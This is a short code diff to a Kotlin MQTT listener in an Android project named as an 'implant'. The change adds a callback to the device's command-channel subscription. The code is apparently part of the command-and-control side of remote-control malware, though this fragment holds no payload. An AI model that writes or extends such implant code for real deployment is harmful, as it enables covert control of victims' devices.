@@ -3,7 +3,6 @@ package com.cooperthecoder.implant.command
 import android.content.Context
 import android.util.Log
 import com.cooperthecoder.implant.data.DeviceProperties
-import org.eclipse.paho.android.service.MqttAndroidClient
 import org.eclipse.paho.client.mqttv3.IMqttActionListener
 import org.eclipse.paho.client.mqttv3.IMqttAsyncClient
 import org.eclipse.paho.client.mqttv3.IMqttToken
@@ -20,7 +19,6 @@ class CommandConnectionListener(context: Context, val channel: String) : IMqttAc
 
     override fun onSuccess(token: IMqttToken) {
         subscribeToCommandChannels(token.client)
-
     }
 
     override fun onFailure(token: IMqttToken, exception: Throwable) {
@@ -31,6 +29,7 @@ class CommandConnectionListener(context: Context, val channel: String) : IMqttAc
     fun subscribeToCommandChannels(client: IMqttAsyncClient) {
         val commandChannelName = DeviceProperties.commandChannelName(context)
         Log.d(TAG, "Connection successful! Subscribing to $commandChannelName")
-        client.subscribe(commandChannelName, DEFAULT_QOS)
+        client.subscribe(commandChannelName, DEFAULT_QOS, null, CommandSubscriptionCallback())
     }
 }
+
